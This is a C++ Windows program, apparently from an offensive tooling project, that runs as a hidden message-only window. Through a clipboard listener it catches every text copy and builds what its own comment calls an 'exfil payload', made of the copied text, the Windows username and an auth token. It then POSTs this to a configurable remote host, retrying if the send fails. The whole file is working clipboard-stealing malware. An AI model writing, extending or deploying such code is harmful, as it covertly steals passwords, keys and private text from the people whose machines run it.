#include <Windows.h>
#include <WinUser.h>

#include <stdio.h>

#include <monstars/http.h>
#include <monstars/logging.h>
#include <monstars/memory.h>
#include <monstars/mutex.h>
#include <monstars/object.h>

#include "bupkus.h"

HINSTANCE g_Instance = nullptr;
HWND g_Window = nullptr;
HANDLE g_SendMutex = nullptr;

// stampable values - configured via web interface or helper script
constexpr wchar_t c_Hostname[128] = L"EVERYBODYGETUP";
constexpr char c_AuthToken[] = "00000000-0000-0000-0000-000000000000";

DWORD SendClipboardText(void*)
{
    if (!OpenClipboard(g_Window))
    {
        return ERROR_CLIPBOARD_NOT_OPEN;
    }

    monstars::HeapBuffer textBuf;
    if (HANDLE data = GetClipboardData(CF_TEXT))
    {
        auto text = static_cast<char*>(GlobalLock(data));
        if (text)
        {
            size_t textLen = strlen(text);
            textBuf.Resize(textLen + 1);
            monstars::memcpy(textBuf.Get<void>(), textBuf.Size(), text, textLen);
            GlobalUnlock(text);
        }
        CloseClipboard();
    }
    if (!textBuf)
    {
        return ERROR_NO_DATA;
    }

    // construct the exfil payload
    char username[MAX_PATH];
    DWORD nameSize = MAX_PATH;
    (void)GetUserNameA(username, &nameSize);

    monstars::HeapBuffer jsonBuf(strlen(c_JsonTemplate) + strlen(c_AuthToken) + textBuf.Size() + sizeof(username));
    snprintf(jsonBuf.Get(), jsonBuf.Size(), c_JsonTemplate, c_AuthToken, username, textBuf.Get());
    size_t jsonLen = strnlen(jsonBuf.Get(), jsonBuf.Size());

    int attempts = c_ConnectAttempts;
    do
    {
        // scoped lock
        {
            monstars::MutexLock lock(g_SendMutex, 300000);  // 5 minute timeout
            if (!lock)
            {
                return ERROR_LOCK_FAILED;
            }
            monstars::HttpClient client(c_Hostname);
            if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
            {
                return ERROR_SUCCESS;
            }
            if (client.Forbidden())
            {
                return ERROR_ACCESS_DENIED;
            }
        }
        if (--attempts) Sleep(c_RetryInterval);
    } while (attempts);

    return ERROR_TIMEOUT;
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    g_Instance = hInstance;
    g_SendMutex = CreateMutexW(nullptr, 0, nullptr);
    g_Window = CreateWindowExW(WS_EX_NOACTIVATE, L"STATIC", nullptr, WS_OVERLAPPEDWINDOW, 0, 0,
        0, 0, HWND_MESSAGE, nullptr, g_Instance, nullptr);

    AddClipboardFormatListener(g_Window);

    while (true)
    {
        static MSG msg = {};

        switch (GetMessageW(&msg, nullptr, 0, 0))
        {
        case -1:
            break;
        case 0:
            break;
        default:
            if (msg.message == WM_CLIPBOARDUPDATE)
            {
                if (IsClipboardFormatAvailable(CF_TEXT))
                {
                    monstars::ObjectHandle thread = CreateThread(nullptr, 0, SendClipboardText, nullptr, 0, nullptr);
                }
            }
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    return ERROR_SUCCESS;
}